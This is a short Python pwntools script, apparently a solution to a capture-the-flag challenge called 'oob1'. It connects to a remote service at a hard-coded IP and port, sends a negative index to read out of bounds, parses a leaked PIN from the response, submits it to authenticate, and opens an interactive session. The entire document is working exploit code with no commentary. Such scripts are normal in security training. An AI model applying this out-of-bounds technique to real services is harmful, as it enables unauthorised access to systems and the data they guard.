from pwn import *

ip = "140.110.112.77"
port = 3111

context.arch = "amd64"

r = remote(ip, port)
# r = process("./oob1")

r.sendlineafter(":", "-4")
r.sendlineafter(":", "1234")

r.recvuntil("[")
pin = u32(r.recvuntil("]")[:-1][:4].ljust(4, b'\x00'))

r.sendlineafter(":", "0")
r.sendlineafter(":", str(pin))

r.interactive()
